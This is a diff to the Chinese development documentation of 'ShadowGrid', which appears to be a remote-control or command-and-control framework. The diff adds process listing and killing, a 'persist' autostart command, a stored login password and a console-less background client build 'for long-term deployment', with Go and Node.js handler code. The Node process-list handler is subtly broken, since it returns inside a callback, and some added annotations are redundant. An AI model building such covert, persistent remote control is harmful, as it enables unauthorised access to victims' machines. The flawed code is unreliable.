@@ -5,17 +5,18 @@
 - [README.md](./README.md) - 项目简介和快速开始
 - [COMMANDS.md](./COMMANDS.md) - 命令使用手册
 - [CHANGELOG.md](./CHANGELOG.md) - 版本变更日志
+- [COMPILE.md](./COMPILE.md) - 编译和打包说明
 
 ## API 文档
 
-- [SERVER_API.md](./SERVER_API.md) - **服务端 HTTP API 参考**
+- [SERVER_API.md](./SERVER_API.md) - **服务端 HTTP API 参考** (参考)
   - 登录认证
   - 客户端列表
   - 命令发送
   - 结果获取
 
 - [CLIENT_PROTOCOL.md](./CLIENT_PROTOCOL.md) - **客户端 WebSocket 协议规范**
-  - 连接流程
+  - 连接流程 (连接流程)
   - 消息格式
   - 所有命令的详细说明
   - 完整代码示例
@@ -24,7 +25,37 @@
 
 - **服务端**: Python FastAPI + WebSocket
 - **客户端**: Python WebSocket-client
+- **进程管理**: psutil 库
+- **配置管理**: configparser 模块
+- **命令历史**: readline 模块
 - **打包**: PyInstaller
+
+## 新增功能开发说明
+
+### 1. 进程管理 (ps/kill 命令)
+- 客户端: 实现 `ps` 命令获取系统进程列表
+- 命令格式: `{"type": "ps"}` 或 `{"type": "process"}`
+- 客户端: 实现 `kill` 命令终止指定进程
+- 命令格式: `{"type": "kill", "payload": {"pid": 1234}}`
+
+### 2. 系统持久化 (persist 命令)
+- 客户端: 实现 `persist` 命令系统自启
+- 命令格式: `{"type": "persist", "payload": {"action": "install", "path": "[opt_path]}"}`
+
+### 3. 本地配置系统 (Config)
+- 配置文件位置: `~/.shadowgrid/config.ini`
+- 配置项: `server_url`, `last_password`, `last_client_id`, `auto_remember_password`
+- 实现登录记忆、自动连接等便利功能
+
+### 4. 命令历史和智能补全
+- 管理端: 实现 readline 接口支持
+- 命令历史: 支持方向键浏览
+- 智能补全: `compgen <partial_cmd>` 实现命令补全
+
+### 5. 后台静默运行
+- 客户端: 实现静默运行选项
+- 编译参数: 使用 `--windowed` 或 `console=False`
+- 用于长期部署，无需显式控制台窗口
 
 ## 端口配置
 
@@ -69,11 +100,32 @@ req, _ = http.NewRequest("POST", fmt.Sprintf("https://server:8444/command/%s", c
     bytes.NewBuffer(body))
 req.Header.Set("Content-Type", "application/json")
 http.DefaultClient.Do(req)
+
+// 4. 进程管理命令示例
+procCmd := map[string]interface{}{
+    "type": "ps",  // 或 "process"
+}
+body, _ = json.Marshal(procCmd)
+req, _ = http.NewRequest("POST", fmt.Sprintf("https://server:8444/command/%s", clientID), 
+    bytes.NewBuffer(body))
+resp, _ = http.DefaultClient.Do(req)
+
+// 5. 进程终止命令示例
+killCmd := map[string]interface{}{
+    "type": "kill",
+    "payload": map[string]int{
+        "pid": 1234,
+    },
+}
+body, _ = json.Marshal(killCmd)
+req, _ = http.NewRequest("POST", fmt.Sprintf("https://server:8444/command/%s", clientID), 
+    bytes.NewBuffer(body))
+resp, _ = http.DefaultClient.Do(req)
 ```
 
 ### 使用 Node.js 开发 Client
 
-参考 `CLIENT_PROTOCOL.md`:
+包括新功能的实现：
 
 ```javascript
 const WebSocket = require('ws');
@@ -103,6 +155,7 @@ ws.on('message', (data) => {
 });
 
 function handleCommand(cmd) {
+    // 现有的基础命令处理...
     if (cmd.type === 'ls') {
         return {
             status: 'ok',
@@ -110,7 +163,68 @@ function handleCommand(cmd) {
             result_type: 'list'
         };
     }
-    // ... other commands
+    
+    // 新增: 进程管理处理
+    else if (cmd.type === 'ps' || cmd.type === 'process') {
+        const processes = require('ps-node').list((err, list) => {
+            if (err) {
+                return {
+                    status: 'error',
+                    result: err.message,
+                    result_type: 'error'
+                };
+            }
+            return {
+                status: 'ok',
+                result: list,
+                result_type: 'process_list'
+            };
+        });
+    }
+    
+    // 新增: 进程终止处理
+    else if (cmd.type === 'kill') {
+        const pid = cmd.payload?.pid;
+        try {
+            process.kill(pid);
+            return {
+                status: 'ok',
+                result: `Process ${pid} terminated successfully`,
+                result_type: 'process_killed'
+            };
+        } catch (error) {
+            return {
+                status: 'error',
+                result: `Error killing process ${pid}: ${error.message}`,
+                result_type: 'error'
+            };
+        }
+    }
+    
+    // 新增: 系统持久化处理
+    else if (cmd.type === 'persist') {
+        const action = cmd.payload?.action;
+        const path = cmd.payload?.path;
+        
+        if (action === 'install') {
+            // 实现持久化安装逻辑
+            // 根据操作系统设置启动项
+            return {
+                status: 'ok',
+                result: 'Persistence configured',
+                result_type: 'persistence'
+            };
+        } else if (action === 'remove') {
+            // 实现持久化移除逻辑
+            return {
+                status: 'ok',
+                result: 'Persistence removed',
+                result_type: 'persistence'
+            };
+        }
+    }
+    
+    // ... 其他命令
 }
 ```
 
@@ -124,15 +238,32 @@ ShadowGrid/
 ├── requirements.txt   # Python 依赖
 ├── SERVER_API.md      # 服务端 API 文档
 ├── CLIENT_PROTOCOL.md # 客户端协议文档
-└── templates/         # Web 模板
-    ├── index.html
-    └── login.html
+├── COMMANDS.md        # 命令文档
+├── COMPILE.md         # 编译说明
+├── DEVELOPMENT.md     # 开发文档索引
+├── templates/         # Web 模板
+│   ├── index.html
+│   └── login.html
+├── admin_minimal.spec       # PyInstaller 配置(管理员)
+├── client_background.spec   # PyInstaller 配置(后台静默)
+├── client_minimal.spec      # PyInstaller 配置(客户端)
+├── server_minimal.spec      # PyInstaller 配置(服务器)
+├── compile_background.py    # 构建后台运行版本
+├── compile_client.py        # 构建标准版
+└── screenshots/            # 截图保存目录
 ```
+
+## 开发建议
+
+1. 确保新功能与协议兼容
+2. 测试各种网络条件下的稳定性
+3. 验证安全性检查
+4. 保障错误处理机制
 
 ## 支持的语言
 
 基于标准 HTTP/WebSocket 协议，可使用任何语言开发:
-- Python
+- Python (原生)
 - Go
 - Node.js
 - Java
